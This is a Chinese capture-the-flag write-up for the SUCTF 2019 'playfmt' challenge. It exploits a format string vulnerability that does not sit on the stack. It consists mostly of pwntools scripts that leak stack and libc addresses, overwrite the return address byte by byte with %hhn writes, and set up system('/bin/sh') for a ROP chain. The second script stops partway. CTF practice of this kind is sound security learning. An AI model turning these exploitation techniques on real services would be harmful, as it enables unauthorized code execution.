suctf_playfmt

发表于2022-08-06|更新于2022-08-02
|阅读量:

参考链接https://www.anquanke.com/post/id/184717

本题使用非栈上的格式化字符串漏洞进行攻击，由于开启了full relro。所以考虑更改返回地址

第一种方法是更改ret 地址为one_gadget。但是buu给的libc我没有找到合适的one_gadget ，只能打通本地

from pwn import*
#p=remote('node4.buuoj.cn',28438)
p=process('./suctf_2019_playfmt')
elf=ELF('./suctf_2019_playfmt')
context.log_level='debug'
libc=ELF('./libc-2.27.so')
#libc=elf.libc
p.recvuntil('=====================')
p.recvuntil('=====================\n')
payload=b'%6$paaaa%23$p'
p.sendline(payload)
stack=int(p.recv(10),16)
p.recvuntil('aaaa')
libc_base=int(p.recv(10),16)-241-libc.sym['__libc_start_main']
one_gadget=libc_base+0x67a7f
stack0=stack-0x20 
stack1=stack0+0x4
print ("stack=============>",hex(stack))
print ("libc_base=========>",hex(libc_base))
print ("one_gadget=========>",hex(one_gadget))

def fmt_ch_one_byte(offset1, offset2, addr, data, dmite=""):
    '''
    单字节模式
    :param offset1:第一偏移位值，此内存保存第二个地址值
    :param offset2:第二个偏移值，此内存保存目标地址值
    :param addr:目标地址，
    :param data:写入的数据
    注意：此方法当目标地址的后2位在0xFD-0xFF时程序会失败，此时需要多试几次
    '''
    addr_4 = addr & 0xFF
    for i in range(context.word_size // 8):
        if (addr_4 + i) == 0:
            payload = '%' + str(offset1) + '$hhn\x00'
        else:
            payload = '%' + str(addr_4 + i) + 'c%' + str(offset1) + '$hhn\x00'
        sleep(0.5)
        # pause()
        # sl(payload)
        p.sendline(payload)  # sl sla 需要根据情况调整
        data_t = (data >> i * 8) & 0XFF
        if data_t == 0:
            payload = '%' + str(offset2) + '$hhn\x00'
        else:
            payload = '%' + str(data_t) + 'c%' + str(offset2) + '$hhn\x00'
        sleep(0.5)
        # pause()
        # sl(payload)
        p.sendline(payload)  # sl sla 需要根据情况调整
    # 恢复offset2中存储的addr的最后1个字节
    payload = '%' + str(addr_4) + 'c%' + str(offset1) + '$hhn\x00'
    sleep(1)
    # sl(payload)
    p.sendline(payload)  # sl sla 需要根据情况调整

第二种方法是在栈中构造好rop链,，这个可以打通远程

from pwn import*
p=remote('node4.buuoj.cn',28438)
#p=process('./suctf_2019_playfmt')
elf=ELF('./suctf_2019_playfmt')
context.log_level='debug'
libc=ELF('./libc-2.27_32.so')
#libc=elf.libc

p.recvuntil('=====================')
p.recvuntil('=====================\n')
payload=b'%6$paaaa%23$p'
p.sendline(payload)
stack=int(p.recv(10),16)
p.recvuntil('aaaa')
libc_base=int(p.recv(10),16)-241-libc.sym['__libc_start_main']
sys=libc_base+libc.sym['system']
binsh=libc_base+next(libc.search(b"/bin/sh"))
stack0=stack-0x20 
stack1=stack0+0x4
stack2=stack0+0xc
stack3=stack0+0x8
print ("stack=============>",hex(stack))
print ("stack1============>",hex(stack1))
print ("stack2============>",hex(stack2))
print ("libc_base=========>",hex(libc_base))
print ("sys===============>",hex(sys))
print ("binsh=============>",hex(binsh))
